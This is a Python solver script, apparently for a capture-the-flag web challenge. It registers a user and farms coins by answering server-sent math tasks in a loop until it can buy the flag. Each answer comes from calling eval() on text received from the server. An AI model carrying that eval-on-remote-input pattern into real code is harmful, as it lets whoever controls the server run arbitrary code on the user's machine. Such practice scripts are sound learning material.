#!/usr/bin/env python3
from json import loads
from re import search
from requests import Session
from time import sleep

url = 'http://mathpong.web.ctfcup.ru'

session = Session()
session.post(url + '/api/signup', json = {'login': 'user', 'password': 'password'})

response = session.post(url + '/api/signin', json = {'login': 'user', 'password': 'password'})
cookie = response.headers['Set-Cookie']

response = session.get(url + '/api/shop', headers = {'Cookie': cookie})
flag_price = int(search('[0-9]+', loads(response.text)['result']).group())

response = session.get(url + '/api/task', headers = {'Cookie': cookie})
result = str(eval(loads(response.text)['result']))

for coin in range(flag_price):
    response = session.post(url + '/api/task', headers = {'Cookie': cookie}, data = result)
    result = str(eval(loads(response.text)['task']))
    sleep(0.1)

response = session.post(url + '/api/shop', headers = {'Cookie': cookie})
result = loads(response.text)['flag']
print('flag:', result)